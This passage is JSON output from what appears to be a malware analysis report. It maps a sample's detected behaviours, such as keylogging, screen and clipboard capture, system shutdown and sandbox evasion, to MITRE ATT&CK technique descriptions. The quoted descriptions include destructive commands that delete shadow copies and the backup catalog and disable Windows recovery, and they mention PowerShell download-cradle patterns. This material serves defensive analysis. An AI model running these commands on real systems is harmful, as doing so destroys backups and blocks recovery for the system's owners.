                "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups.\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\nvssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet\nWindows Management Instrumentation can be used to delete volume shadow copies - wmic shadowcopy delete\nwbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet\nbcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no\nREAgentC.exe can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Inhibit System Recovery"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1490/",
                "id": "T1490",
                "name": "Inhibit System Recovery"
              },
              {
                "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as MSExchangeIS, which will make Exchange content inaccessible . In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Service Stop"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1489/",
                "id": "T1489",
                "name": "Service Stop"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0034/",
            "id": "TA0034",
            "name": "Impact"
          },
          {
            "description": "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
            "techniques": [
              {
                "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups.\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\nvssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet\nWindows Management Instrumentation can be used to delete volume shadow copies - wmic shadowcopy delete\nwbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet\nbcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no\nREAgentC.exe can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Inhibit System Recovery"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1490/",
                "id": "T1490",
                "name": "Inhibit System Recovery"
              },
              {
                "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as MSExchangeIS, which will make Exchange content inaccessible . In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Service Stop"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1489/",
                "id": "T1489",
                "name": "Service Stop"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0040/",
            "id": "TA0040",
            "name": "Impact"
          },
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the profiles tool to install malicious .mobileconfig files. In macOS 11+, the use of the profiles tool can no longer install configuration profiles, however .mobileconfig files can be planted and installed with user interaction.\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions. There have also been similar examples of extensions being used for command & control.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Browser Extensions"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1176/",
                "id": "T1176",
                "name": "Browser Extensions"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Virtualization / Sandbox Evasion"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts.\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Remote File Copy"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1105/",
                "id": "T1105",
                "name": "Ingress Tool Transfer"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Virtualization / Sandbox Evasion"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\nHooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\nReading raw keystroke data from the hardware buffer.\nWindows Registry modifications.\nCustom drivers.\nModify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions. \n",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "log keystrokes"
                  },
                  {
                    "severity": "INFO",
                    "description": "log keystrokes via polling"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/001/",
                "id": "T1056.001",
                "name": "Keylogging"
              },
              {
                "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "capture screenshot"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1113/",
                "id": "T1113",
                "name": "Screen Capture"
              },
              {
                "description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \nFor example, on Windows adversaries can access clipboard data by using clip.exe or Get-Clipboard. Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., Transmitted Data Manipulation).\nmacOS and Linux also have commands, such as pbpaste, to grab clipboard contents.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "list drag and drop files"
                  },
                  {
                    "severity": "INFO",
                    "description": "open clipboard"
                  },
                  {
                    "severity": "INFO",
                    "description": "read clipboard data"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1115/",
                "id": "T1115",
                "name": "Clipboard Data"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts.\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "download and write a file"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1105/",
                "id": "T1105",
                "name": "Ingress Tool Transfer"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to manipulate, interrupt, or destroy your devices and data.\n\nThe impact tactic consists of techniques used by the adversary to execute his or her mission objectives but that do not cleanly fit into another category such as Collection. Mission objectives vary based on each adversary's goals, but examples include toll fraud, destruction of device data, or locking the user out of his or her device until a ransom is paid.",
            "techniques": [
              {
                "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. reload).\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "shutdown system"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1529/",
                "id": "T1529",
                "name": "System Shutdown/Reboot"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0034/",
            "id": "TA0034",
            "name": "Impact"
          },
          {
            "description": "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
            "techniques": [
              {
                "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. reload).\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "shutdown system"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1529/",
                "id": "T1529",
                "name": "System Shutdown/Reboot"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0040/",
            "id": "TA0040",
            "name": "Impact"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "compiled with AutoIt"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              },
              {
                "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and Net.\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "interact with driver via control codes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1569/002/",
                "id": "T1569.002",
                "name": "Service Execution"
              },
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "link function at runtime on Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "parse PE header"
                  },
                  {
                    "severity": "INFO",
                    "description": "link many functions at runtime"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nVarious utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.\nOn network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get session user name"
                  },
                  {
                    "severity": "INFO",
                    "description": "get token membership"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1033/",
                "id": "T1033",
                "name": "System Owner/User Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "enumerate gui resources"
                  },
                  {
                    "severity": "INFO",
                    "description": "find graphical window"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1010/",
                "id": "T1010",
                "name": "Application Window Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "query or enumerate registry value"
                  },
                  {
                    "severity": "INFO",
                    "description": "query or enumerate registry key"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get memory capacity"
                  },
                  {
                    "severity": "INFO",
                    "description": "query environment variable"
                  },
                  {
                    "severity": "INFO",
                    "description": "get hostname"
                  },
                  {
                    "severity": "INFO",
                    "description": "get COMSPEC environment variable"
                  },
                  {
                    "severity": "INFO",
                    "description": "get system information on Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "get disk information"
                  },
                  {
                    "severity": "INFO",
                    "description": "get disk size"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get common file path"
                  },
                  {
                    "severity": "INFO",
                    "description": "check if file exists"
                  },
                  {
                    "severity": "INFO",
                    "description": "enumerate files on windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "get file version info"
                  },
                  {
                    "severity": "INFO",
                    "description": "enumerate files recursively"
                  },
                  {
                    "severity": "INFO",
                    "description": "get file size"
                  },
                  {
                    "severity": "INFO",
                    "description": "enumerate files on Windows"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get session user name"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1087/",
                "id": "T1087",
                "name": "Account Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "enumerate processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. \nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language or parsing the outputs of Windows API functions GetUserDefaultUILanguage, GetSystemDefaultUILanguage, GetKeyboardLayoutList and GetUserDefaultLangID.\nOn a macOS or Linux system, adversaries may query locale to retrieve the value of the $LANG environment variable.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get keyboard layout"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1614/001/",
                "id": "T1614.001",
                "name": "System Language Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "enumerate processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/",
                "id": "T1518",
                "name": "Software Discovery"
              },
              {
                "description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "check for unmoving mouse cursor"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/002/",
                "id": "T1497.002",
                "name": "User Activity Based Checks"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
